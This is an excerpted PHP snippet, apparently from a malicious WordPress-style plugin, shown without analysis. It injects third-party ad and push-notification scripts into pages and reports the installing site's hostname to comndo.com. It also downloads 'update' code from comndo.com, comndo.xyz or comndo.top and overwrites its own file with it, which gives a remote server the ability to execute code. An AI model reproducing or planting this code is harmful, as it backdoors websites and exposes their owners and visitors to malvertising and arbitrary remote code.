...
$plugin_key='6cb1f92f8eb4db75bfde18ac6047d5dc';
$version='1.2';
...
$ad_code="
<script>(function(s,u,z,p){s.src=u,s.setAttribute('data-zone',z),p.appendChild(s);})(document.createElement('script'),'https://iclickcdn.com/tag.min.js',3440038,document.body||document.documentElement)</script>
<script src=\"https://propu.sh/pfe/current/tag.min.js?z=3440045\" data-cfasync=\"false\" async></script>
<script type=\"text/javascript\" src=\"//inpagepush.com/400/3440052\" data-cfasync=\"false\" async=\"async\"></script>
";
...
{
    if(!$log_installed = @file_get_contents("http://www.comndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]))
{
    $log_installed = @file_get_contents_ccode("http://www.comndo.com/o2.php?host=".$_SERVER["HTTP_HOST"]);
}
}
/*************************set default options***************************/
...
if( ini_get('allow_url_fopen') ) {
        ...
        if (($new_version = @file_get_contents("http://www.comndo.com/update.php") OR $new_version = @file_get_contents_ccode("http://www.comndo.com/update.php")) AND stripos($new_version, $plugin_key) !== false) {
            ...
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                ...
                elseif ($new_version = @file_get_contents("http://www.comndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
        ...
        elseif ($new_version = @file_get_contents("http://www.comndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
...
else
{
            ...
            if (stripos($new_version, $plugin_key) !== false AND stripos($new_version, '$version=') !== false) {
               @file_put_contents(__FILE__, $new_version);
                ...
                elseif ($new_version = @file_get_contents_ccode("http://www.comndo.xyz/update.php") AND stripos($new_version, $plugin_key) !== false) {
        ...
        elseif ($new_version = @file_get_contents_ccode("http://www.comndo.top/update.php") AND stripos($new_version, $plugin_key) !== false) {
